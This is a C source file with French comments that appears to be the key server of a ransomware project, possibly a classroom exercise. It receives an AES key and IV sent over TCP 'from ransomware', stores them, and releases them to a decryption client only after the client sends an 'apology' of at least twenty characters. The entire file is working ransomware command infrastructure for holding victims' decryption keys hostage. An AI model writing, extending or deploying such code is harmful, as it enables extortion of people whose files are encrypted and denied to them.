#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/socket.h>

#define PORT 4242
#define BUFFER_SIZE 1024

unsigned char stored_key[32];
unsigned char stored_iv[16];
int key_iv_received = 0;  // Flag pour vérifier si on a bien reçu une clé

// Fonction utilitaire pour charger la clé et l’IV reçus
void recevoir_cle_et_iv() {
    int listen_fd, client_fd;
    struct sockaddr_in addr;
    socklen_t len = sizeof(addr);

    // Création du socket pour recevoir clé/IV
    listen_fd = socket(AF_INET, SOCK_STREAM, 0);
    addr.sin_family = AF_INET;
    addr.sin_port = htons(PORT);
    addr.sin_addr.s_addr = INADDR_ANY;

    bind(listen_fd, (struct sockaddr *)&addr, sizeof(addr));
    listen(listen_fd, 1);

    printf("[INFO] En attente des clés depuis ransomware...\n");
    client_fd = accept(listen_fd, (struct sockaddr *)&addr, &len);

    recv(client_fd, stored_key, 32, 0);  // réception clé
    recv(client_fd, stored_iv, 16, 0);   // réception IV

    key_iv_received = 1;
    printf("[OK] Clé et IV reçus et stockés côté serveur.\n");

    close(client_fd);
    close(listen_fd);
}

int main() {
    recevoir_cle_et_iv();  // Étape 1 : on reçoit la clé/IV en amont

    // Étape 2 : on attend une connexion d’un client_decrypt
    int server_fd, client_fd;
    struct sockaddr_in server_addr;
    socklen_t addr_len = sizeof(server_addr);
    char buffer[BUFFER_SIZE] = {0};

    // Nouveau socket pour gérer les excuses
    server_fd = socket(AF_INET, SOCK_STREAM, 0);
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(PORT);

    bind(server_fd, (struct sockaddr *)&server_addr, sizeof(server_addr));
    listen(server_fd, 1);

    printf("[INFO] Serveur en écoute pour les excuses sur le port %d...\n", PORT);
    client_fd = accept(server_fd, (struct sockaddr *)&server_addr, &addr_len);
    printf("[INFO] Client connecté.\n");

    recv(client_fd, buffer, sizeof(buffer), 0);
    printf("[INFO] Message reçu : %s\n", buffer);

    // Vérification de la longueur des excuses
    if (strlen(buffer) >= 20 && key_iv_received) {
        send(client_fd, stored_key, 32, 0);
        send(client_fd, stored_iv, 16, 0);
        printf("[OK] Excuses acceptées. Clé et IV envoyés.\n");
    } else {
        char *msg = "Excuses insuffisantes ou clé non reçue.";
        send(client_fd, msg, strlen(msg), 0);
        printf("[ERREUR] Excuses refusées ou clé absente.\n");
    }

    close(client_fd);
    close(server_fd);
    return 0;
}
